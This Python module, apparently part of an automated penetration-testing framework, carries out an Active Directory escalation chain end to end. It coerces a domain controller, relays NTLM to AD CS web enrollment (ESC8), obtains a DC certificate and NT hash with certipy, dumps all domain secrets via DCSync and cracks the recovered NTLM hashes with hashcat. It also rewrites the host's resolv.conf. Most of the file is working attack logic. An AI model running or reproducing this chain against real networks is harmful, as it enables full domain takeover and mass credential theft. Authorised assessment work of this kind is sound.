# Author: Ali Alaqoul <alialaqoul@gmail.com>
"""Automatic AD privilege escalation for the deterministic autorun.

When an assessment holds a domain credential and the environment exposes an AD CS
CA with HTTP web enrollment (ESC8) plus a coercible DC, this runs the no-fix
chain end to end and feeds the loot back into the session:

    coerce a DC -> NTLM-relay to CA web enrollment (ESC8) -> DC certificate
      -> certipy auth (DC NT hash) -> secretsdump DCSync -> crack the NT hashes

It is **best-effort and hard-gated**: it needs root (ntlmrelayx binds 445) and
silently skips whenever a precondition is missing (no credential, no DC, no CA,
web enrollment off, relay produced no cert), so it never breaks an assessment
against a target that isn't vulnerable to this path.
"""
from __future__ import annotations

import os
import re
import socket
import subprocess
import urllib.request
import urllib.error
from pathlib import Path
from typing import Callable, Optional

from . import store


def _open_ports(entry: dict) -> set:
    return {p["port"] for p in entry.get("ports", {}).values()
            if p.get("state") == "open"}


def _find_dc(hosts: dict) -> Optional[str]:
    """A domain controller = a host with Kerberos + LDAP open."""
    for h, e in hosts.items():
        if {88, 389} <= _open_ports(e):
            return h
    return None


def _hostname_to_ip(hosts: dict, short: str) -> Optional[str]:
    short = short.lower()
    for h, e in hosts.items():
        if (e.get("hostname") or "").lower() == short:
            return h
    return None


def _web_enrollment_up(ca_ip: str) -> bool:
    """True if http://<ca>/certsrv/ answers (401 = present & needs auth)."""
    try:
        urllib.request.urlopen(f"http://{ca_ip}/certsrv/", timeout=6)
        return True
    except urllib.error.HTTPError as e:
        return e.code in (401, 200)
    except (urllib.error.URLError, OSError):
        return False


def _crack_and_record(dump: str, domain: str,
                      record: Callable[[str, str, str], None]) -> None:
    """Crack the NT hashes in a secretsdump dump with hashcat and record the
    recovered plaintext as a transcript entry (so it upgrades the stored hashes)."""
    empty = "31d6cfe0d16ae931b73c59d7e0c089c0"
    nt: dict = {}
    for m in re.finditer(r"^([^\s:]+):\d+:[a-f0-9]{32}:([a-f0-9]{32}):::", dump, re.M):
        principal, h = m.group(1), m.group(2)
        if principal.endswith("$") or principal.startswith("$") or h == empty:
            continue
        nt[h] = principal.rpartition("\\")[2] or principal
    if not nt:
        return
    Path("/tmp/ap_nt.txt").write_text("\n".join(nt) + "\n")
    wl = "/usr/share/wordlists/rockyou.txt"
    if not Path(wl).exists() and Path(wl + ".gz").exists():
        subprocess.run(["gunzip", "-k", wl + ".gz"], check=False)
    if not Path(wl).exists():
        return
    subprocess.run(["hashcat", "-m", "1000", "/tmp/ap_nt.txt", wl, "--force",
                    "--potfile-path", "/tmp/ap_nt.pot", "--quiet"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
    show = subprocess.run(["hashcat", "-m", "1000", "/tmp/ap_nt.txt", "--show",
                           "--potfile-path", "/tmp/ap_nt.pot"],
                          capture_output=True, text=True, check=False).stdout
    lines = ["Cracked NTLM hashes:"]
    for line in show.splitlines():
        h, _, p = line.strip().partition(":")
        if h in nt and p:
            lines.append(f"Credential: {nt[h]}:{p} @ {domain or 'unknown'}")
    if len(lines) > 1:
        record("crack_hashes", "hashcat -m 1000 (NTLM)", "\n".join(lines))


def auto_escalate(hosts: dict, run_fn: Callable[..., object],
                  record: Callable[[str, str, str], None],
                  say: Callable[[str], None]) -> bool:
    """Attempt the ESC8 -> DCSync -> crack chain. Returns True if it ran the
    relay. ``run_fn(tool, **kw)`` runs a registered tool and records it (returns
    the ToolResult); ``record(name, command, output)`` appends a raw entry."""
    if not hasattr(os, "geteuid") or os.geteuid() != 0:
        say("AD escalation skipped — needs root (ntlmrelayx binds 445).")
        return False
    f = store.facts()
    user, pw, domain = f.get("username"), f.get("password"), f.get("domain")
    if not (user and pw):
        return False
    dc = _find_dc(hosts)
    if not dc:
        return False

    # BloodHound-collection-driven: surface the shortest ACL path / recommended
    # abuse from the collected graph to inform the escalation (the ESC8 chain
    # below is the executor). Non-fatal.
    try:
        from . import bloodhound as _bh
        _a = _bh.analyze(["."], user)
        if _a.get("collected"):
            say(f"BloodHound: {_a.get('summary', '')}")
            _rec = _a.get("recommendation")
            if _rec:
                say(f"BloodHound recommends: {_rec['action']} "
                    f"({_rec['first_edge']} on {_rec['path_to']}"
                    + (f", via {_rec['tool']}" if _rec.get("tool") else "") + ")")
    except Exception:
        pass

    say(f"AD escalation: probing {dc} for an AD CS ESC8 path")
    # DNS -> the DC, so certipy/hostname resolution works on an air-gapped box.
    try:
        Path("/etc/resolv.conf").write_text(f"nameserver {dc}\n")
    except OSError:
        pass

    r = run_fn("netexec_module", target=dc, protocol="ldap", module="adcs",
               username=user, password=pw, domain=domain)
    out = (getattr(r, "raw_output", "") if r else "") or ""
    m = re.search(r"Enrollment Server:\s*(\S+)", out)
    if not m:
        say("no AD CS enrollment server found — skipping ESC8.")
        return False
    ca_fqdn = m.group(1).strip()
    ca_ip = _hostname_to_ip(hosts, ca_fqdn.split(".")[0])
    if not ca_ip:
        try:
            ca_ip = socket.gethostbyname(ca_fqdn)
        except OSError:
            ca_ip = None
    if not ca_ip:
        say(f"could not resolve CA {ca_fqdn} to an in-scope IP — skipping ESC8.")
        return False
    if not _web_enrollment_up(ca_ip):
        say(f"CA {ca_fqdn} has no HTTP web enrollment (no ESC8) — skipping.")
        return False

    say(f"ESC8 available on {ca_fqdn} ({ca_ip}) — coercing {dc} and relaying")
    store.set_fact("pfx", "")
    run_fn("ntlm_relay", target=dc, relay_to=ca_ip, mode="adcs",
           username=user, password=pw, domain=domain)
    pfx = store.get_fact("pfx")
    if not pfx:
        say("ESC8 relay produced no certificate — skipping.")
        return True

    store.set_fact("nthash", "")
    ra = run_fn("certipy_auth", target=dc, pfx=pfx)
    aout = (getattr(ra, "raw_output", "") if ra else "") or ""
    nthash = store.get_fact("nthash")
    am = (re.search(r"[Uu]sing principal: '([^'@]+)", aout)
          or re.search(r"Got hash for '([^'@]+)", aout))
    dc_acct = am.group(1) if am else None
    if not (nthash and dc_acct):
        say("certificate auth did not yield the DC hash — skipping DCSync.")
        return True

    say(f"DCSync as {dc_acct} — replicating every domain secret")
    rd = run_fn("secretsdump", target=dc, username=dc_acct, hash=nthash,
                domain=domain, just_dc="true")
    dump = (getattr(rd, "raw_output", "") if rd else "") or ""
    _crack_and_record(dump, domain or "", record)
    return True
